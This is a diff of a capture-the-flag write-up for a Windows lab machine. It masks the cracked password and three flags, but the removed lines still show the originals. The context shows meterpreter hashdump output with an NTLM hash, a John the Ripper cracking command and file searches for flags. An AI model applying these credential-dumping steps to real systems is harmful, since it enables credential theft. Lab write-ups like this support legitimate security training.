@@ -140,7 +140,7 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
 2. Question `Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?` Answer `Jon`
 3. Save hashes in a file named `hash.txt` and use `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` to crack the hash.
-4. Question `Copy this password hash to a file and research how to crack it. What is the cracked password?` Answer `alqfna22`
+4. Question `Copy this password hash to a file and research how to crack it. What is the cracked password?` Answer `*******`
 
 ## Find flags
 1. We can goto `C:\\` abd get first flag using `cat flag1.txt`.
@@ -169,7 +169,7 @@ Mode              Size   Type  Last modified              Name
 000000/---------  0      fif   1970-01-01 05:30:00 +0530  pagefile.sys
 
 meterpreter > cat flag1.txt
-flag{access_the_machine}
+flag{********************************}
 ```
 2. We can use `search -f flag2.txt` and `search -f flag2.txt` to find second and third flag to submit, as we already know the first one.
 ```bash
@@ -184,7 +184,7 @@ c:\Windows\System32\config\flag2.txt  34            2019-03-18 01:02:48 +0530
 meterpreter > cat c:\Windows\System32\config\flag2.txt
 [-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
 meterpreter > cat "c:\Windows\System32\config\flag2.txt"
-flag{sam_database_elevated_access}
+flag{********************************s}
 meterpreter > search -f flag3.txt
 Found 1 result...
 =================
@@ -194,8 +194,8 @@ Path                              Size (bytes)  Modified (UTC)
 c:\Users\Jon\Documents\flag3.txt  37            2019-03-18 00:56:36 +0530
 
 meterpreter > cat "c:\Users\Jon\Documents\flag3.txt"
-flag{admin_documents_can_be_valuable}
+flag{********************************}
 ```
-3. flag1 : `flag{access_the_machine}` flag2: `flag{sam_database_elevated_access}` flag3:`flag{admin_documents_can_be_valuable}`
+3. flag1 : `flag{********************************}` flag2: `flag{********************************}` flag3:`flag{********************************}`
 
 Author: Zishan Ahamed Thandar
